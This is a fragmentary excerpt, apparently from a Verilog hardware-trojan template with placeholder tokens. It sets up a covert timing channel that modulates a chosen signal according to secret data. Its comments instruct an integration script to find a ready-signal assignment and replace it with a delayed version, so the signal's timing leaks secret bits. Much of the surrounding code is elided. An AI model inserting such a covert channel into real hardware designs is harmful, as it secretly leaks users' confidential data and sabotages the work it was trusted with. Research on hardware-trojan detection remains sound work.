 ...
 * Payload: Modulate timing of {{PAYLOAD_SIGNAL}} based on secret data
 * 
...
assign secret_bit = {{PAYLOAD_SIGNAL}}[0];
...
// ============================================================
// Covert Channel: Modulate timing of {{PAYLOAD_SIGNAL}}
//
// Integration Script Must Modify:
//
// IF {{PAYLOAD_SIGNAL}} is timing-sensitive:
//   Find: assign {{PAYLOAD_SIGNAL}} = ready_signal;
//   Replace: assign {{PAYLOAD_SIGNAL}} = (timing_delay == 0) ? ready_signal : 1'b0;
//
